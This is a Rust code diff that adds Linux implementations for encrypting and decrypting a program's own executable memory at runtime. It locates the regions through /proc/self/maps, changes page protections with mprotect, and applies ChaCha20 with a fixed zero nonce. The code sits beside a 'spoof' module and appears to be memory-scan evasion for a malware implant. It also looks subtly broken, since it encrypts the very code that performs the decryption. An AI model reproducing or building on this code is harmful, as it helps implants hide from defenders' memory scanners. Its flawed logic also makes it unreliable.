@@ -100,7 +100,38 @@ pub mod crypto {
     }
 
     #[cfg(not(windows))]
-    unsafe fn get_code_sections() -> Vec<(*mut u8, usize)> { Vec::new() }
+    unsafe fn get_code_sections() -> Vec<(*mut u8, usize)> {
+        // Parse /proc/self/maps to locate executable (r-xp) memory regions
+        // that belong to the current binary.
+        use std::io::{BufRead, BufReader};
+        let exe_path = match std::env::current_exe() {
+            Ok(p) => p.to_string_lossy().to_string(),
+            Err(_) => return Vec::new(),
+        };
+        let f = match std::fs::File::open("/proc/self/maps") {
+            Ok(f) => f,
+            Err(_) => return Vec::new(),
+        };
+        let mut sections = Vec::new();
+        for line in BufReader::new(f).lines().flatten() {
+            // Format: <start>-<end> <perms> <offset> <dev> <inode> [pathname]
+            // We want lines with r-xp permission that belong to our binary.
+            if !line.contains("r-xp") && !line.contains("r--p") { continue; }
+            if !line.contains(&exe_path) { continue; }
+            let addr_range = match line.split_whitespace().next() {
+                Some(r) => r,
+                None => continue,
+            };
+            let mut parts = addr_range.splitn(2, '-');
+            let start_hex = parts.next().unwrap_or("0");
+            let end_hex = parts.next().unwrap_or("0");
+            let start = usize::from_str_radix(start_hex, 16).unwrap_or(0);
+            let end = usize::from_str_radix(end_hex, 16).unwrap_or(0);
+            if start == 0 || end <= start { continue; }
+            sections.push((start as *mut u8, end - start));
+        }
+        sections
+    }
 
     #[cfg(windows)]
     pub fn encrypt_sections() {
@@ -211,9 +242,47 @@ pub mod crypto {
     }
 
     #[cfg(not(windows))]
-    pub fn encrypt_sections() {}
+    pub fn encrypt_sections() {
+        use chacha20::{ChaCha20, cipher::{KeyIvInit, StreamCipher}};
+        unsafe {
+            let mut key = [0u8; 32];
+            rand::thread_rng().fill_bytes(&mut key);
+            SESSION_KEY.with(|k| { *k.borrow_mut() = key; });
+            let nonce = [0u8; 12];
+            let mut cipher = ChaCha20::new(&key.into(), &nonce.into());
+            std::ptr::write_volatile(&mut key as *mut _, [0u8; 32]);
+            let page_size = libc::sysconf(libc::_SC_PAGESIZE) as usize;
+            for (addr, size) in get_code_sections() {
+                let aligned = (addr as usize) & !(page_size - 1);
+                let aligned_size = ((addr as usize + size) - aligned + page_size - 1) & !(page_size - 1);
+                libc::mprotect(aligned as *mut libc::c_void, aligned_size, libc::PROT_READ | libc::PROT_WRITE);
+                let slice = std::slice::from_raw_parts_mut(addr, size);
+                cipher.apply_keystream(slice);
+                libc::mprotect(aligned as *mut libc::c_void, aligned_size, libc::PROT_READ | libc::PROT_EXEC);
+            }
+        }
+    }
+
     #[cfg(not(windows))]
-    pub fn decrypt_sections() {}
+    pub fn decrypt_sections() {
+        use chacha20::{ChaCha20, cipher::{KeyIvInit, StreamCipher}};
+        unsafe {
+            let mut key = [0u8; 32];
+            SESSION_KEY.with(|k| { key = *k.borrow(); });
+            let nonce = [0u8; 12];
+            let mut cipher = ChaCha20::new(&key.into(), &nonce.into());
+            std::ptr::write_volatile(&mut key as *mut _, [0u8; 32]);
+            let page_size = libc::sysconf(libc::_SC_PAGESIZE) as usize;
+            for (addr, size) in get_code_sections() {
+                let aligned = (addr as usize) & !(page_size - 1);
+                let aligned_size = ((addr as usize + size) - aligned + page_size - 1) & !(page_size - 1);
+                libc::mprotect(aligned as *mut libc::c_void, aligned_size, libc::PROT_READ | libc::PROT_WRITE);
+                let slice = std::slice::from_raw_parts_mut(addr, size);
+                cipher.apply_keystream(slice);
+                libc::mprotect(aligned as *mut libc::c_void, aligned_size, libc::PROT_READ | libc::PROT_EXEC);
+            }
+        }
+    }
 }
 
 pub mod spoof {
